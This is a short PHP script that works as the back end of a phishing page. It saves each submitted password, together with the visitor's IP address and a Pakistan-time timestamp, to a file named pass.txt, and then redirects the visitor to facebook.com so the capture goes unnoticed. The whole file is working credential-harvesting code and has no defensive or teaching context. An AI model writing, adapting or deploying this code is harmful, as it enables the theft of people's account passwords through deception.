<?php
date_default_timezone_set('Asia/Karachi'); // Set the timezone to Pakistan

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the password from the form
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Get the sender's IP address
    $senderIP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

    // Get the current Pakistan time
    $pakistanTime = date('Y-m-d H:i:s');

    // Prepare the data to be saved
    $data = "Password: $password\nSender IP: $senderIP\nPakistan Time: $pakistanTime\n\n";

    // Save the data to pass.txt
    file_put_contents('pass.txt', $data, FILE_APPEND);

    // You can add additional processing or redirect the user after saving the data
    // For example, redirecting to a success page
    header('Location: https://www.facebook.com/');
    exit;
}
?>
